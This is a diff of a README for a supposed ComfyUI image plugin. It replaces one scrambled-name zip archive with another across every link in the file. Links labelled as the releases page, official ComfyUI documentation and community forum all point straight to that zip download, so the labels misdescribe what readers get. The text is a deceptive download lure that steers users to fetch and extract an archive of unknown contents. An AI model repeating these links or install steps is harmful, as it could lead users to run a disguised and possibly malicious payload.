@@ -4,7 +4,7 @@
 Welcome to ComfyUI_RH_ZImageI2L! This is a plugin that enhances your ComfyUI setup by integrating the Z-Image-i2L functionality. This application provides a seamless experience, making it easy for you to manage and manipulate your images.
 
 ## 🔗 Quick Download
-[![Download ComfyUI_RH_ZImageI2L](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)
+[![Download ComfyUI_RH_ZImageI2L](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)
 
 ## 🚀 Getting Started
 To install ComfyUI_RH_ZImageI2L, follow these simple steps:
@@ -12,13 +12,13 @@ To install ComfyUI_RH_ZImageI2L, follow these simple steps:
 1. **Visit the Releases Page**
    Click the link below to access the releases page, where you can find the latest version of the plugin:
 
-   [Visit this page to download](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)
+   [Visit this page to download](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)
 
 2. **Choose Your Version**
    On the releases page, look for the most recent version. It typically appears at the top of the list. Click it to view the details.
 
 3. **Download the Plugin**
-   Locate the download link for the plugin. It will have a name like `https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip`. Click the link to begin the download.
+   Locate the download link for the plugin. It will have a name like `https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip`. Click the link to begin the download.
 
 4. **Extract the Files**
    Once the file is downloaded, find it in your downloads folder. Right-click on the file and choose "Extract All" to unpack the contents. This will create a new folder with the plugin files.
@@ -59,14 +59,14 @@ We welcome contributions from users! If you have suggestions for improvements or
 ## 🔗 Additional Resources
 For more information on ComfyUI and how to use additional plugins, check out the following resources:
 
-- [ComfyUI Official Documentation](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)
-- [ComfyUI Community Forum](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)
+- [ComfyUI Official Documentation](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)
+- [ComfyUI Community Forum](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)
 
 Feel free to explore these links for further guidance and community support.
 
 ## 🎉 Download & Install
 Ready to start using ComfyUI_RH_ZImageI2L? Visit the releases page again to download the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/rshdpdc/ComfyUI_RH_ZImageI2L/main/workflows/U-R-Comfy-Z-Image-L-1.2.zip)
+[Visit this page to download](https://github.com/rshdpdc/ComfyUI_RH_ZImageI2L/raw/refs/heads/main/workflows/Image-Z-L-R-U-Comfy-2.6.zip)
 
 Follow the instructions above, and you'll be all set to enjoy new features that enhance your ComfyUI experience.
